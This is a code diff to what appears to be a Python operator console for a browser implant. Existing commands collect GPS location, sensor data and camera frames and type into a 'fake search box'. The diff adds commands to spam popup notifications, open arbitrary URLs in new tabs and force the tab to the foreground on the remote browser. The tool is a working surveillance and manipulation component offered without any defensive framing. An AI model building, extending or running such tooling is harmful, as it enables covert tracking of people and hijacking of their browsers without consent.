@@ -46,7 +46,7 @@ COMMAND_LOG = []
 LATEST = {"gps": None, "frame": None, "frame_ts": None, "last_hit": None}
 LOCK = threading.Lock()
 FRAME_COUNTER = {}
-BEACON_QUIET = False  # flip to True if you want to silence per-beacon prints
+BEACON_QUIET = False  # flip to True to silence per-beacon prints
 
 
 def now_iso():
@@ -598,6 +598,9 @@ commands:
   locate [n]               request location n times
   sensors [sec]            sample sensors for sec seconds
   search "text"            type into the fake search box
+  spam N interval "title" | "body"   fire popup N times, interval sec apart
+  open "url"               open url in a new tab (browser may block)
+  focus                    try to bring our tab to the foreground
   ping                     test the channel
   clear                    clear command log
   help                     show this
@@ -721,6 +724,26 @@ def console_loop():
             cmd = {"name": "sensors", "args": {"seconds": s}}
         elif verb == "search":
             cmd = {"name": "search", "args": {"text": parse_text()}}
+        elif verb == "spam":
+            # spam N interval_seconds "title" | "body"
+            bits = rest.split(None, 2)
+            count = int(bits[0]) if len(bits) > 0 and bits[0].isdigit() else 5
+            interval = int(bits[1]) if len(bits) > 1 and bits[1].isdigit() else 8
+            tail = (bits[2] if len(bits) > 2 else "").strip()
+            if "|" in tail:
+                a, b = tail.split("|", 1)
+                t = a.strip().strip('"')
+                bd = b.strip().strip('"')
+            else:
+                t = "Message"
+                bd = tail.strip('"')
+            cmd = {"name": "spam",
+                   "args": {"count": count, "interval_ms": interval * 1000,
+                            "title": t, "body": bd}}
+        elif verb == "open":
+            cmd = {"name": "open", "args": {"url": parse_text()}}
+        elif verb == "focus":
+            cmd = {"name": "focus", "args": {}}
         elif verb == "ping":
             cmd = {"name": "ping", "args": {}}
         else:
